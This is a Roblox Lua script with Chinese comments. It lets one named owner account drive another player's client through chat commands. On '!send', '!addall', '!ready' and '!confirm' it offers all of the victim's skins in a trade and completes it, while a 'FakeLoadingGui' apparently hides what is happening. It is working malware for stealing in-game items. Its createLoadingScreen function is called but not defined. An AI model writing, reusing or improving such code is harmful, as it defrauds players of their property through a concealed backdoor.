local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")
local MainEvent = ReplicatedStorage:WaitForChild("MainEvent")

local OwnerName = "XxStormCrystalxX2016"

-- 📦 找玩家 (partial match)
local function getPlayerByPartialName(name)
    name = name:lower()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name:lower():sub(1, #name) == name then
            return player
        end
    end
end

-- 📦 發送交易邀請
local function sendTradeRequest(targetName)
    local target = getPlayerByPartialName(targetName)
    if target then
        MainEvent:FireServer("Trading", "Request", target)
        print("✅ 發送交易邀請給 " .. target.Name)
    else
        warn("⚠️ 找不到玩家")
    end
end

-- 📦 加入所有持有皮膚
local function addAllSkins()
    local skinsStr = LocalPlayer.DataFolder.Skins.Value
    local success, skinsTable = pcall(function()
        return loadstring("return " .. skinsStr)()
    end)
    if not success then
        warn("皮膚資料錯誤")
        return
    end

    for category, skins in pairs(skinsTable) do
        for skinName, quantity in pairs(skins) do
            if quantity > 0 then
                for i = 1, quantity do
                    MainEvent:FireServer("Trading", "Add", category, skinName)
                    task.wait(0.05)
                end
            end
        end
    end
    print("✅ 已加入所有持有皮膚")
end

-- 📦 Ready & Confirm
local function tradeReady()
    MainEvent:FireServer("Trading", "Ready", "", "")
    print("✅ Ready 完成")
end

local function tradeConfirm()
    MainEvent:FireServer("Trading", "Confirm", "", "")
    print("✅ Confirm 完成")
end

-- 📦 隱藏/顯示 Loading 畫面
local function hideLoadingScreen()
    if LocalPlayer.PlayerGui:FindFirstChild("FakeLoadingGui") then
        LocalPlayer.PlayerGui.FakeLoadingGui:Destroy()
        print("✅ Loading UI 已關閉")
    end
end

local function showLoadingScreen()
    createLoadingScreen()
    print("✅ Loading UI 已打開")
end

-- 📦 綁定主帳聊天監聽
local function setupCommands(player)
    if player.Name == OwnerName then
        player.Chatted:Connect(function(msg)
            local args = msg:split(" ")
            local cmd = args[1]:lower()
            local target = args[2]

            if cmd == "!send" and target then
                sendTradeRequest(target)
            elseif cmd == "!addall" then
                addAllSkins()
            elseif cmd == "!ready" then
                tradeReady()
            elseif cmd == "!confirm" then
                tradeConfirm()
            elseif cmd == "!hideui" then
                hideLoadingScreen()
            elseif cmd == "!showui" then
                showLoadingScreen()
            end
        end)
    end
end

Players.PlayerAdded:Connect(setupCommands)
for _, player in ipairs(Players:GetPlayers()) do
    setupCommands(player)
end
